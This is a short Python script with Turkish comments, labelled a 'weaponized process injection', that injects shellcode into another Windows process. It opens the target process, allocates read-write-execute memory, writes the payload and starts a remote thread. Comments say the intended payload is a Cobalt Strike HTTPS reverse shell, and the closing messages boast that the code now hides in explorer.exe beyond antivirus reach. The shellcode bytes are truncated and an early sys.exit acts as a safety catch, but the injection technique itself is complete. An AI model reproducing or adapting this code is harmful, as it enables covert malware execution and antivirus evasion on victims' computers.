import ctypes
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Code Injection saldırısı.")

print("--- WEAPONIZED PROCESS INJECTION ---")

def inject_shellcode(pid):
    # 1. PAYLOAD (Weaponized Part)
    # Simülasyon: b"\x90..." (Zararsız)
    # Gerçek: Cobalt Strike HTTPS Reverse Shell
    
    shellcode = b"\xfc\x48\x83\xe4\xf0\xe8..." # Binlerce byte
    
    print(f"[*] Hedef PID: {pid}")
    
    # 2. HAFIZA OPERASYONU
    # OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread
    
    h_proc = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
    
    # RWX (Read-Write-Execute) izniyle hafıza aç
    ptr = ctypes.windll.kernel32.VirtualAllocEx(h_proc, 0, len(shellcode), 0x3000, 0x40)
    
    # Kodu yaz
    ctypes.windll.kernel32.WriteProcessMemory(h_proc, ptr, shellcode, len(shellcode), 0)
    
    # Çalıştır
    ctypes.windll.kernel32.CreateRemoteThread(h_proc, 0, 0, ptr, 0, 0, 0)
    
    print("💀 KOD ENJEKTE EDİLDİ.")
    print("Zararlı yazılım artık 'explorer.exe' içinde yaşıyor. Antivirüs dosyayı silemez.")

if __name__ == "__main__":
    inject_shellcode(1234)